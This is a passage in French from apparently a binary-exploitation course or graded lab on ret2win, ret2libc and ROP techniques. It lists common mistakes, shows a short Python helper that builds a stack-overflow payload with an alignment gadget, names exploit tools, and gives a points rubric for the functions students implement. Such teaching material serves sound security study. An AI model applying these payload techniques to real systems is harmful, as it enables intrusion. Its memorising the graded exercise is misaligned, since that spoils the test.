3. **Confondre PLT et GOT**: PLT est le stub, GOT contient l'adresse réelle.

4. **Mauvais offsets libc**: Chaque version de libc a des offsets différents.

### Bonnes Pratiques

```python
# Toujours vérifier l'alignement
def safe_exploit(offset, target, ret_gadget):
    payload = b'A' * offset
    payload += p64(ret_gadget)  # Toujours ajouter pour être sûr
    payload += p64(target)
    return payload

# Valider les offsets avec une libc connue
def validate_libc(base, expected_puts, puts_offset):
    calculated = base + puts_offset
    assert calculated == expected_puts
```

---

## Section 8 : Ressources et Références

### Outils
- one_gadget: github.com/david942j/one_gadget
- ROPgadget: github.com/JonathanSalwan/ROPgadget
- libc-database: github.com/niklasb/libc-database

### Documentation
- x86-64 ABI: refspecs.linuxfoundation.org

---

## Barème de Notation

| Critère | Points |
|---------|--------|
| generate_ret2win_payload | 15 |
| generate_ret2libc_simple | 25 |
| calculate_libc_addresses | 20 |
| generate_one_gadget_payload | 15 |
| generate_rop_leak_payload | 15 |
| detect_stack_alignment_needed | 10 |
| **Total** | **100** |
